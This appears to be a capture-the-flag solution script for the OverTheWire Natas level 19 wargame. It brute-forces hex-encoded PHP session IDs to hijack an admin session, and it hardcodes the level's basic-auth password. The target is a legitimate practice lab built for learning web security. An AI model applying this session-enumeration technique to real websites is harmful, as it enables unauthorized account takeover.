#!/usr/bin/env python3

import requests
from requests.auth import HTTPBasicAuth

link = "http://natas19.natas.labs.overthewire.org/index.php"

def main():

	for i in range(275, 640):
		#Cookie: PHPSESSID=3233352d61646d696e
		PHPSESSID = f"{i}-admin".encode('utf-8').hex()
		resp = requests.post(link, auth=('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), cookies={"PHPSESSID":PHPSESSID}).text
		if "You are logged in as a regular user." in resp:
			print(i)
		else:
			print(resp)
			break
	    

if __name__ == '__main__':
	main()
    